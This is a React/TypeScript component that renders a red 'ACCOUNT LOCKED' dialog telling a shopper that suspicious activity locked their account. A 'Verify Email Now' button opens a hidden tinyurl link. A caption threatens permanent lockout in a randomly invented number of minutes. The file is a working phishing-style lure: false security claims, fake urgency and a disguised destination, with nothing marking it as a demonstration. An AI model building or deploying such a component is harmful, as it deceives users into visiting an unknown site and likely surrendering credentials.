import React from 'react';
import {
  Dialog,
  DialogContent,
  Button,
  Typography,
  Box,
  IconButton,
} from '@mui/material';
import CloseIcon from '@mui/icons-material/Close';
import LockIcon from '@mui/icons-material/Lock';
import WarningIcon from '@mui/icons-material/Warning';

interface LockedAccountProps {
  open: boolean;
  onClose: () => void;
}

export const LockedAccount: React.FC<LockedAccountProps> = ({
  open,
  onClose,
}) => {
  const handleVerify = () => {
    window.open('https://tinyurl.com/abc', '_blank');
  };

  return (
    <Dialog
      open={open}
      onClose={onClose}
      maxWidth="sm"
      fullWidth
      sx={{
        '& .MuiDialog-paper': {
          background: 'linear-gradient(135deg, #ff4d4d 0%, #cc0000 100%)',
          borderRadius: '16px',
          position: 'relative',
          overflow: 'visible',
          border: '3px solid #ffffff',
        },
      }}
    >
      <Box sx={{ position: 'relative', width: '100%', height: '100%' }}>
        <IconButton
          aria-label="close"
          onClick={onClose}
          sx={{
            position: 'absolute',
            right: -10,
            top: -10,
            backgroundColor: '#ffffff',
            color: '#cc0000',
            zIndex: 9999,
            '&:hover': {
              backgroundColor: '#f0f0f0',
            },
            boxShadow: '0 0 10px rgba(0,0,0,0.3)',
          }}
        >
          <CloseIcon />
        </IconButton>
        <DialogContent>
          <Box
            sx={{
              textAlign: 'center',
              py: 4,
              px: 2,
              color: 'white',
            }}
          >
            <LockIcon sx={{ fontSize: 60, mb: 2, color: '#ffffff' }} />
            <Typography
              variant="h4"
              sx={{
                fontWeight: 'bold',
                mb: 2,
                textTransform: 'uppercase',
                letterSpacing: '2px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: 1
              }}
            >
              <WarningIcon /> ACCOUNT LOCKED <WarningIcon />
            </Typography>
            <Typography
              variant="body1"
              sx={{
                mb: 3,
                color: '#ffffff',
                fontSize: '1.1rem'
              }}
            >
              For your security, your account has been temporarily locked due to suspicious activity.
            </Typography>
            <Typography
              variant="body1"
              sx={{
                mb: 4,
                color: '#ffffff',
                fontWeight: 'bold'
              }}
            >
              Please verify your email immediately to restore access to your account and continue shopping.
            </Typography>
            <Button
              variant="contained"
              onClick={handleVerify}
              fullWidth
              sx={{
                mt: 2,
                py: 2,
                backgroundColor: '#ffffff',
                color: '#cc0000',
                fontWeight: 'bold',
                fontSize: '1.1rem',
                '&:hover': {
                  backgroundColor: '#f0f0f0',
                },
              }}
            >
              🔒 Verify Email Now 🔒
            </Button>
            <Typography
              variant="caption"
              sx={{
                display: 'block',
                mt: 2,
                color: '#ffffff',
                fontSize: '0.8rem'
              }}
            >
              ⚠️ Your account will be permanently locked in {Math.floor(Math.random() * 10) + 1} minutes if not verified
            </Typography>
          </Box>
        </DialogContent>
      </Box>
    </Dialog>
  );
};
